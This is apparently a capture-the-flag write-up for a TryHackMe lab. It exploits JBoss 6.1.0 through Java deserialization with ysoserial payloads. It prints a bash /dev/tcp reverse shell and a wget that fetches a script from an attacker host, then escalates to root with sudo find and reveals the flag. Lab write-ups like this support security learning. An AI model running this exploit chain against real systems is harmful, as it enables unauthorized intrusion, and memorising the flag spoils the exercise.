---
tags:
  - THM
  - Linux
  - Easy
  - Deserialization
  - RCE
  - Leakage
  - Sudo
---
https://tryhackme.com/room/tonythetiger/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.67.155.198 tony.thm
```
# Scanning
```console
$ nmap -p22,80,1090,1091,1098,1099,3873,4446,4712,4713,5445,5455,5500,5501,8009,8080,8083 -sV -sC tony.thm

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d6:97:8c:b9:74:d0:f3:9e:fe:f3:a5:ea:f8:a9:b5:7a (DSA)
|   2048 33:a4:7b:91:38:58:50:30:89:2d:e4:57:bb:07:bb:2f (RSA)
|   256 21:01:8b:37:f5:1e:2b:c5:57:f1:b0:42:b7:32:ab:ea (ECDSA)
|_  256 f6:36:07:3c:3b:3d:71:30:c4:cd:2a:13:00:b5:25:ae (ED25519)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Tony&#39;s Blog
|_http-generator: Hugo 0.66.0
|_http-server-header: Apache/2.4.7 (Ubuntu)
1090/tcp open  java-rmi    Java RMI
|_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug)
1091/tcp open  java-rmi    Java RMI
1098/tcp open  java-rmi    Java RMI
1099/tcp open  java-object Java Object Serialization
| fingerprint-strings: 
|   NULL: 
|     java.rmi.MarshalledObject|
|     hash[
|     locBytest
|     objBytesq
|     xp8N
|     #http://thm-java-deserial.home:8083/q
|     org.jnp.server.NamingServer_Stub
|     java.rmi.server.RemoteStub
|     java.rmi.server.RemoteObject
|     xpwA
|     UnicastRef2
|     thm-java-deserial.home
|_    JYVd
3873/tcp open  java-object Java Object Serialization
4446/tcp open  java-object Java Object Serialization
4712/tcp open  msdtc       Microsoft Distributed Transaction Coordinator (error)
4713/tcp open  pulseaudio?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    126a
5445/tcp open  smbdirect?
5455/tcp open  apc-5455?
5500/tcp open  hotline?
| fingerprint-strings: 
|   DNSStatusRequestTCP, HTTPOptions, SSLSessionReq: 
|     CRAM-MD5
|     NTLM
|     DIGEST-MD5
|     GSSAPI
|     thm-java-deserial
|   DNSVersionBindReqTCP, GenericLines, NULL, TerminalServerCookie: 
|     CRAM-MD5
|     DIGEST-MD5
|     GSSAPI
|     NTLM
|     thm-java-deserial
|   GetRequest: 
|     CRAM-MD5
|     DIGEST-MD5
|     NTLM
|     GSSAPI
|     thm-java-deserial
|   Help: 
|     GSSAPI
|     DIGEST-MD5
|     NTLM
|     CRAM-MD5
|     thm-java-deserial
|   Kerberos: 
|     NTLM
|     CRAM-MD5
|     DIGEST-MD5
|     GSSAPI
|     thm-java-deserial
|   RPCCheck: 
|     DIGEST-MD5
|     NTLM
|     CRAM-MD5
|     GSSAPI
|     thm-java-deserial
|   RTSPRequest, TLSSessionReq: 
|     NTLM
|     GSSAPI
|     CRAM-MD5
|     DIGEST-MD5
|_    thm-java-deserial
5501/tcp open  tcpwrapped
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|   Potentially risky methods: PUT DELETE TRACE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-server-header: Apache-Coyote/1.1
|_http-title: Welcome to JBoss AS
8083/tcp open  http        JBoss service httpd
|_http-title: Site doesn't have a title (text/html).
5 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port1099-TCP:V=7.98%I=7%D=12/12%Time=693CBAC9%P=x86_64-pc-linux-gnu%r(N
SF:ULL,17B,"\xac\xed\0\x05sr\0\x19java\.rmi\.MarshalledObject\|\xbd\x1e\x9
SF:7\xedc\xfc>\x02\0\x03I\0\x04hash\[\0\x08locBytest\0\x02\[B\[\0\x08objBy
SF:tesq\0~\0\x01xp8N\xbe\x10ur\0\x02\[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02\0
SF:\0xp\0\0\x004\xac\xed\0\x05t\0#http://thm-java-deserial\.home:8083/q\0~
SF:\0\0q\0~\0\0uq\0~\0\x03\0\0\0\xcd\xac\xed\0\x05sr\0\x20org\.jnp\.server
SF:\.NamingServer_Stub\0\0\0\0\0\0\0\x02\x02\0\0xr\0\x1ajava\.rmi\.server\
SF:.RemoteStub\xe9\xfe\xdc\xc9\x8b\xe1e\x1a\x02\0\0xr\0\x1cjava\.rmi\.serv
SF:er\.RemoteObject\xd3a\xb4\x91\x0ca3\x1e\x03\0\0xpwA\0\x0bUnicastRef2\0\
SF:0\x16thm-java-deserial\.home\0\0\x04JYVd\x85\|\xa4\x9e0\x88\xea\xc0\xfe
SF:\0\0\x01\x9b\x151\xbdA\x80\x02\0x");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3873-TCP:V=7.98%I=7%D=12/12%Time=693CBACF%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4446-TCP:V=7.98%I=7%D=12/12%Time=693CBACF%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4713-TCP:V=7.98%I=7%D=12/12%Time=693CBACF%P=x86_64-pc-linux-gnu%r(N
SF:ULL,5,"126a\n")%r(GenericLines,5,"126a\n")%r(GetRequest,5,"126a\n")%r(H
SF:TTPOptions,5,"126a\n")%r(RTSPRequest,5,"126a\n")%r(RPCCheck,5,"126a\n")
SF:%r(DNSVersionBindReqTCP,5,"126a\n")%r(DNSStatusRequestTCP,5,"126a\n")%r
SF:(Help,5,"126a\n")%r(SSLSessionReq,5,"126a\n")%r(TerminalServerCookie,5,
SF:"126a\n")%r(TLSSessionReq,5,"126a\n")%r(Kerberos,5,"126a\n")%r(SMBProgN
SF:eg,5,"126a\n")%r(X11Probe,5,"126a\n")%r(FourOhFourRequest,5,"126a\n")%r
SF:(LPDString,5,"126a\n")%r(LDAPSearchReq,5,"126a\n")%r(LDAPBindReq,5,"126
SF:a\n")%r(SIPOptions,5,"126a\n")%r(LANDesk-RC,5,"126a\n")%r(TerminalServe
SF:r,5,"126a\n")%r(NCP,5,"126a\n")%r(NotesRPC,5,"126a\n")%r(JavaRMI,5,"126
SF:a\n")%r(WMSRequest,5,"126a\n")%r(oracle-tns,5,"126a\n")%r(ms-sql-s,5,"1
SF:26a\n")%r(afp,5,"126a\n")%r(giop,5,"126a\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5500-TCP:V=7.98%I=7%D=12/12%Time=693CBACF%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x08CR
SF:AM-MD5\x01\nDIGEST-MD5\x01\x06GSSAPI\x01\x04NTLM\x02\x11thm-java-deseri
SF:al")%r(GenericLines,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0
SF:\0\x02\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x01\x06GSSAPI\x01\x04NTLM\x02\x1
SF:1thm-java-deserial")%r(GetRequest,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x
SF:03\x03\x04\0\0\0\x02\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x01\x04NTLM\x01\x0
SF:6GSSAPI\x02\x11thm-java-deserial")%r(HTTPOptions,4B,"\0\0\0G\0\0\x01\0\
SF:x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x08CRAM-MD5\x01\x04NTLM\x01\nDI
SF:GEST-MD5\x01\x06GSSAPI\x02\x11thm-java-deserial")%r(RTSPRequest,4B,"\0\
SF:0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x04NTLM\x01\x06G
SF:SSAPI\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x02\x11thm-java-deserial")%r(RPCC
SF:heck,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\nDIG
SF:EST-MD5\x01\x04NTLM\x01\x08CRAM-MD5\x01\x06GSSAPI\x02\x11thm-java-deser
SF:ial")%r(DNSVersionBindReqTCP,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x0
SF:3\x04\0\0\0\x02\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x01\x06GSSAPI\x01\x04NT
SF:LM\x02\x11thm-java-deserial")%r(DNSStatusRequestTCP,4B,"\0\0\0G\0\0\x01
SF:\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x08CRAM-MD5\x01\x04NTLM\x01\
SF:nDIGEST-MD5\x01\x06GSSAPI\x02\x11thm-java-deserial")%r(Help,4B,"\0\0\0G
SF:\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x06GSSAPI\x01\nDIGES
SF:T-MD5\x01\x04NTLM\x01\x08CRAM-MD5\x02\x11thm-java-deserial")%r(SSLSessi
SF:onReq,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x08
SF:CRAM-MD5\x01\x04NTLM\x01\nDIGEST-MD5\x01\x06GSSAPI\x02\x11thm-java-dese
SF:rial")%r(TerminalServerCookie,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x
SF:03\x04\0\0\0\x02\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x01\x06GSSAPI\x01\x04N
SF:TLM\x02\x11thm-java-deserial")%r(TLSSessionReq,4B,"\0\0\0G\0\0\x01\0\x0
SF:3\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x04NTLM\x01\x06GSSAPI\x01\x08CRAM
SF:-MD5\x01\nDIGEST-MD5\x02\x11thm-java-deserial")%r(Kerberos,4B,"\0\0\0G\
SF:0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x04NTLM\x01\x08CRAM-M
SF:D5\x01\nDIGEST-MD5\x01\x06GSSAPI\x02\x11thm-java-deserial");
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
```

Summary:
- Port 80 has Tony's blog.
- Port 1099 has a Java RMI service.
- Port 8080 has a JBoss AS instance.
# JBoss AS Enumeration
In JBoss AS, successful login at `/admin-console/login.seam` using default credentials `admin:admin`.

The current running version is `6.1.0.Final`, which is vulnerable to [CVE-2013-2185](https://nvd.nist.gov/vuln/detail/CVE-2013-2185).
# Exploitation
Following [this guide](https://medium.com/@Av1na4sH/java-deserialization-jboss-6-1-0-b43b2114f32f), cloned the [ysoserial repository](https://github.com/frohoff/ysoserial) and prepared the payload generation using Docker:
```console
$ git clone https://github.com/frohoff/ysoserial.git

$ cd ysoserial/

$ docker build -t ysoserial .
```
Host a `rev.sh` file using Python:
```console
$ echo 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1' > rev.sh

$ python3 -m http.server 8000
```
Wait for connections:
```bash
nc -lvnp <PORT>
```
Get a reverse shell using RCE via Java Deserialization:
```console
$ docker run ysoserial CommonsCollections5 "wget -O /tmp/rev.sh http://<ATTACKER-IP>:8000/rev.sh" > cmd

$ curl -X POST --data-binary @./cmd 'http://tony.thm:8080/invoker/JMXInvokerServlet'

$ docker run ysoserial CommonsCollections5 "/bin/bash /tmp/rev.sh" > cmd

$ curl -X POST --data-binary @./cmd 'http://tony.thm:8080/invoker/JMXInvokerServlet'

$ rm ./cmd
```
# Post-Exploitation
## User Migration
We are **user cmnatic** and we have some notes in our home directory:
```console
$ whoami
cmnatic

$ cat /home/cmnatic/to-do.txt
I like to keep a track of the various things I do throughout the day.

Things I have done today:
 - Added a note for JBoss to read for when he next logs in.
 - Helped Tony setup his website!
 - Made sure that I am not an administrator account 

Things to do:
 - Update my Java! I've heard it's kind of in-secure, but it's such a headache to update. Grrr!
```
Found **jboss password** in his notes:
```console
$ cat /home/jboss/note

Hey JBoss!

Following your email, I have tried to replicate the issues you were having with the system.

However, I don't know what commands you executed - is there any file where this history is stored that I can access?

Oh! I almost forgot... I have reset your password as requested (make sure not to tell it to anyone!)

Password: likeaboss

Kind Regards,
CMNatic
```
Become **jboss user**:
```console
$ su jboss
Password:

$ whoami
jboss
```
Found the **user flag**:
```bash
cat /home/jboss/.jboss.txt
```
## Privilege Escalation
We can run the `find` command using `sudo`:
```console
$ sudo -l

Matching Defaults entries for jboss on thm-java-deserial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jboss may run the following commands on thm-java-deserial:
    (ALL) NOPASSWD: /usr/bin/find
```
Using [GTFOBins guide](https://gtfobins.github.io/gtfobins/find/), become root:
```console
$ sudo find . -exec /bin/sh \; -quit

# whoami
root
```
The **root flag** is a base64-encoded MD5 hash:
```console
$ cat /root/root.txt
QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==

$ base64 -d /root/root.txt 2>/dev/null
BC77AC072EE30E3760806864E234C7CF
```
Get the **root flag** using [CrackStation](https://crackstation.net/).